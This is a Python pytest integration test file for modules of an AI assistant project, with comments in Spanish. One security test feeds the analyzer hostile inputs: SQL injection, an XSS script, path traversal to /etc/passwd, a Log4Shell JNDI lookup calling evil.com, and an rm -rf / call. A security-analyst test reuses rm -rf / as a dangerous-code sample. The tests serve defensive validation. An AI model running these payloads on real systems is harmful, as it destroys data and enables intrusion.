"""
Tests de Integración Agresivos - Claw-Litle 1.0 1.0

Estos tests verifican:
1. Integración entre módulos 1.0
2. Flujos end-to-end completos
3. Casos borde y estrés
4. Seguridad y validación
5. Rendimiento bajo carga
"""

import pytest
import time
import threading
import json
from typing import Dict, List, Any
from datetime import datetime


class TestV4Integration:
    """Tests de integración agresivos para features 1.0"""
    
    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup para cada test"""
        # Resetear módulos
        import src.features.feature_flags as ff
        import src.features.query_complexity_analyzer as qca
        import src.features.self_refining_engine as sre
        import src.features.adaptive_thinking_controller as atc
        
        ff._manager = None
        qca._analyzer = None
        sre._engine = None
        atc._controller = None
    
    def test_feature_flags_integration_with_complexity_analyzer(self):
        """Test: Feature Flags controla Complexity Analyzer"""
        from src.features.feature_flags import get_feature_flags_manager
        from src.features.query_complexity_analyzer import get_complexity_analyzer
        
        manager = get_feature_flags_manager()
        analyzer = get_complexity_analyzer()
        
        # Deshabilitar feature
        manager.disable("query_complexity_analyzer")
        assert not manager.is_enabled("query_complexity_analyzer")
        
        # El analyzer debería seguir funcionando (no depende del flag directamente)
        result = analyzer.analyze("Test query")
        assert result.score >= 0
        
        # Rehabilitar
        manager.enable("query_complexity_analyzer")
        assert manager.is_enabled("query_complexity_analyzer")
    
    def test_complexity_analyzer_integration_with_adaptive_thinking(self):
        """Test: Complexity Analyzer alimenta Adaptive Thinking"""
        from src.features.query_complexity_analyzer import get_complexity_analyzer, ThinkingLevel as QCA_ThinkingLevel
        from src.features.adaptive_thinking_controller import get_adaptive_thinking_controller, ThinkingLevel as AT_ThinkingLevel
        
        analyzer = get_complexity_analyzer()
        controller = get_adaptive_thinking_controller()
        
        # Configurar callback
        def complexity_callback(query, context):
            return analyzer.analyze(query)
        
        controller.set_complexity_analyzer(complexity_callback)
        
        # Probar queries de diferentes complejidades
        test_cases = [
            ("Hola", AT_ThinkingLevel.RAPIDO),
            ("Busca información", AT_ThinkingLevel.ESTANDAR),
            ("Analiza y compara datos complejos", AT_ThinkingLevel.PROFUNDO),
            ("Desarrolla un sistema completo con múltiples componentes y análisis exhaustivo", AT_ThinkingLevel.MAXIMO)
        ]
        
        for query, expected_level in test_cases:
            decision = controller.determine_thinking_level(query)
            assert decision.determined_level.value >= expected_level.value or decision.determined_level.value <= expected_level.value + 1
    
    def test_self_refining_integration_with_adaptive_thinking(self):
        """Test: Self-Refining Engine usa configuración de Adaptive Thinking"""
        from src.features.self_refining_engine import get_self_refining_engine
        from src.features.adaptive_thinking_controller import get_adaptive_thinking_controller, ThinkingLevel
        
        engine = get_self_refining_engine()
        controller = get_adaptive_thinking_controller()
        
        # Configurar callbacks simples
        def gen(q, c):
            return "Respuesta inicial para: " + q
        
        def crit(q, r, c):
            issues = []
            if len(r) < 50:
                issues.append("Respuesta muy corta")
            return issues
        
        def ref(q, d, i, c):
            return d + " [Refinada]"
        
        engine.set_generator(gen)
        engine.set_critic(crit)
        engine.set_refiner(ref)
        
        # Simular configuración de Adaptive Thinking
        config = controller.level_configs[ThinkingLevel.PROFUNDO]
        
        result = engine.refine(
            "Test query",
            max_iterations=config.self_refining_iterations,
            confidence_threshold=config.confidence_threshold
        )
        
        assert result.iterations_used <= config.self_refining_iterations
        assert result.final_confidence >= 0
    
    def test_end_to_end_query_processing(self):
        """Test: Flujo completo de procesamiento de query"""
        from src.features.feature_flags import get_feature_flags_manager
        from src.features.query_complexity_analyzer import get_complexity_analyzer
        from src.features.adaptive_thinking_controller import get_adaptive_thinking_controller
        from src.features.self_refining_engine import get_self_refining_engine
        
        # 1. Verificar feature flags
        flags = get_feature_flags_manager()
        assert flags.is_enabled("query_complexity_analyzer")
        assert flags.is_enabled("adaptive_thinking")
        assert flags.is_enabled("self_refining_engine")
        
        # 2. Analizar complejidad
        analyzer = get_complexity_analyzer()
        complexity = analyzer.analyze("Genera un scraper web con análisis de datos")
        assert complexity.score > 0
        
        # 3. Determinar nivel de pensamiento
        controller = get_adaptive_thinking_controller()
        controller.set_complexity_analyzer(lambda q, c: analyzer.analyze(q))
        decision = controller.determine_thinking_level("Genera un scraper web con análisis de datos")
        assert decision.determined_level in [ThinkingLevel.ESTANDAR, ThinkingLevel.PROFUNDO]
        
        # 4. Configurar self-refining según decisión
        engine = get_self_refining_engine()
        engine.confidence_threshold = decision.config.confidence_threshold
        engine.max_iterations = decision.config.self_refining_iterations
        
        # Verificar que la configuración se aplicó
        assert engine.confidence_threshold == decision.config.confidence_threshold
        assert engine.max_iterations == decision.config.self_refining_iterations
    
    def test_concurrent_access_multiple_threads(self):
        """Test: Acceso concurrente desde múltiples hilos"""
        from src.features.feature_flags import get_feature_flags_manager
        from src.features.query_complexity_analyzer import get_complexity_analyzer
        
        results = []
        errors = []
        
        def worker(thread_id):
            try:
                analyzer = get_complexity_analyzer()
                for i in range(10):
                    result = analyzer.analyze(f"Query from thread {thread_id}, iteration {i}")
                    results.append((thread_id, result.score))
            except Exception as e:
                errors.append((thread_id, str(e)))
        
        # Crear 5 hilos
        threads = []
        for i in range(5):
            t = threading.Thread(target=worker, args=(i,))
            threads.append(t)
            t.start()
        
        # Esperar a todos
        for t in threads:
            t.join()
        
        # Verificar resultados
        assert len(errors) == 0, f"Errores: {errors}"
        assert len(results) == 50  # 5 hilos * 10 iteraciones
        assert all(0 <= score <= 10 for _, score in results)
    
    def test_memory_usage_under_load(self):
        """Test: Uso de memoria bajo carga"""
        import tracemalloc
        from src.features.query_complexity_analyzer import get_complexity_analyzer
        
        analyzer = get_complexity_analyzer()
        
        # Iniciar monitoreo de memoria
        tracemalloc.start()
        
        # Ejecutar 1000 análisis
        for i in range(1000):
            analyzer.analyze(f"Test query {i} con palabras complejas como analizar y comparar")
        
        # Verificar uso de memoria
        current, peak = tracemalloc.get_traced_memory()
        tracemalloc.stop()
        
        # El pico no debería exceder 50MB
        assert peak < 50 * 1024 * 1024, f"Pico de memoria: {peak / 1024 / 1024:.2f}MB"
    
    def test_performance_benchmark(self):
        """Test: Benchmark de rendimiento"""
        from src.features.query_complexity_analyzer import get_complexity_analyzer
        
        analyzer = get_complexity_analyzer()
        
        # Medir tiempo para 100 análisis
        start = time.time()
        for i in range(100):
            analyzer.analyze("Query de prueba con análisis complejo")
        elapsed = time.time() - start
        
        # Cada análisis debería tomar menos de 10ms en promedio
        avg_time = (elapsed / 100) * 1000
        assert avg_time < 10, f"Tiempo promedio: {avg_time:.2f}ms"
    
    def test_edge_cases_empty_and_special_inputs(self):
        """Test: Casos borde - inputs vacíos y especiales"""
        from src.features.query_complexity_analyzer import get_complexity_analyzer
        from src.features.self_refining_engine import get_self_refining_engine
        
        analyzer = get_complexity_analyzer()
        
        # Query vacía
        result = analyzer.analyze("")
        assert result.score == 0.0
        assert result.level.name == "RAPIDO"
        
        # Query con solo espacios
        result = analyzer.analyze("   ")
        assert result.score == 0.0
        
        # Query con caracteres especiales
        result = analyzer.analyze("!@#$%^&*()")
        assert isinstance(result.score, float)
        
        # Query muy larga
        long_query = "a" * 10000
        result = analyzer.analyze(long_query)
        assert result.score <= 10.0
        
        # Query con unicode
        result = analyzer.analyze("你好世界 🌍 émojis")
        assert isinstance(result.score, float)
    
    def test_security_input_validation(self):
        """Test: Validación de seguridad en inputs"""
        from src.features.query_complexity_analyzer import get_complexity_analyzer
        
        analyzer = get_complexity_analyzer()
        
        # Intentar inyección de código
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "__import__('os').system('rm -rf /')",
        ]
        
        for malicious_input in malicious_inputs:
            # No debería lanzar excepción ni ejecutar código
            result = analyzer.analyze(malicious_input)
            assert isinstance(result.score, float)
            assert 0 <= result.score <= 10
    
    def test_config_validation(self):
        """Test: Validación de configuración"""
        from src.features.query_complexity_analyzer import QueryComplexityAnalyzer
        from src.features.self_refining_engine import SelfRefiningEngine
        
        # Configuraciones inválidas
        invalid_configs = [
            {"thresholds": {"invalid_level": 5.0}},  # Nivel inválido
            {"confidence_threshold": 1.5},  # Fuera de rango
            {"max_iterations": -1},  # Negativo
        ]
        
        for config in invalid_configs:
            # Debería manejar gracefully
            analyzer = QueryComplexityAnalyzer(config)
            result = analyzer.analyze("Test")
            assert isinstance(result.score, float)
    
    def test_state_consistency_after_errors(self):
        """Test: Consistencia de estado después de errores"""
        from src.features.self_refining_engine import get_self_refining_engine
        
        engine = get_self_refining_engine()
        
        # Intentar sin callbacks (debería fallar)
        result = engine.refine("Test")
        assert "Error" in result.final_answer or result.final_confidence == 0.0
        
        # El engine debería seguir funcional
        engine.set_generator(lambda q, c: "Generated")
        result = engine.refine("Test")
        assert result.final_answer is not None
    
    def test_stats_and_monitoring(self):
        """Test: Estadísticas y monitoreo"""
        from src.features.adaptive_thinking_controller import get_adaptive_thinking_controller
        
        controller = get_adaptive_thinking_controller()
        
        # Resetear stats
        controller.reset_stats()
        assert controller.stats["total_decisions"] == 0
        
        # Tomar algunas decisiones
        for i in range(5):
            controller.determine_thinking_level(f"Test query {i}")
        
        # Verificar stats
        stats = controller.get_stats()
        assert stats["total_decisions"] == 5
        assert sum(stats["level_distribution"].values()) == 5
    
    def test_serialization_and_deserialization(self):
        """Test: Serialización y deserialización"""
        from src.features.adaptive_thinking_controller import get_adaptive_thinking_controller
        
        controller = get_adaptive_thinking_controller()
        decision = controller.determine_thinking_level("Test query compleja")
        
        # Serializar a dict
        data = decision.to_dict()
        assert isinstance(data, dict)
        assert "query" in data
        assert "determined_level" in data
        assert "config" in data
        
        # Verificar que se puede convertir a JSON
        json_str = json.dumps(data)
        assert isinstance(json_str, str)
        
        # Verificar que se puede recuperar
        recovered = json.loads(json_str)
        assert recovered["determined_level"] == decision.determined_level.name


class TestSecurityAnalystIntegration:
    """Tests de integración para Security Analyst"""
    
    def test_security_analyst_basic(self):
        """Test básico de Security Analyst"""
        try:
            from src.features.security_analyst import SecurityAnalyst
            
            analyst = SecurityAnalyst()
            
            # Código seguro
            safe_code = """
def add(a, b):
    return a + b
"""
            result = analyst.analyze(safe_code)
            assert result.score >= 0.7  # Debería ser seguro
            
            # Código peligroso
            dangerous_code = """
import os
os.system("rm -rf /")
"""
            result = analyst.analyze(dangerous_code)
            assert result.score < 0.5  # Debería ser peligroso
            
        except ImportError:
            pytest.skip("Security Analyst no disponible")
    
    def test_enhanced_buddy_reviewer_basic(self):
        """Test básico de Enhanced Buddy Reviewer"""
        try:
            from src.features.enhanced_buddy_reviewer import EnhancedBuddyReviewer
            from src.code_gen.buddy_reviewer import ReviewVerdict
            
            reviewer = EnhancedBuddyReviewer()
            
            code = """
def hello():
    print("Hello, World!")
"""
            result = reviewer.review(code)
            assert result.verdict in [ReviewVerdict.APPROVED, ReviewVerdict.NEEDS_FIX, ReviewVerdict.BLOCKED]
            
        except ImportError:
            pytest.skip("Enhanced Buddy Reviewer no disponible")


class TestKairosDaemonIntegration:
    """Tests de integración para KAIROS Daemon"""
    
    def test_kairos_daemon_basic(self):
        """Test básico de KAIROS Daemon"""
        try:
            from src.features.kairos_daemon import KairosDaemon
            
            daemon = KairosDaemon()
            
            # Verificar que se puede iniciar
            assert daemon.is_running is False
            
            # Iniciar (en modo simulado)
            daemon.start()
            assert daemon.is_running is True
            
            # Detener
            daemon.stop()
            assert daemon.is_running is False
            
        except ImportError:
            pytest.skip("KAIROS Daemon no disponible")


class TestContextManagerIntegration:
    """Tests de integración para Context Manager"""
    
    def test_context_manager_basic(self):
        """Test básico de Context Manager"""
        try:
            from src.features.context_manager import ContextManager
            
            manager = ContextManager()
            
            # Agregar mensajes
            manager.add_message("user", "Hola")
            manager.add_message("assistant", "¡Hola! ¿Cómo estás?")
            
            assert manager.message_count == 2
            
            # Obtener contexto
            context = manager.get_context()
            assert len(context) > 0
            
            # Compactar
            manager.compact()
            assert manager.message_count >= 0
            
        except ImportError:
            pytest.skip("Context Manager no disponible")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])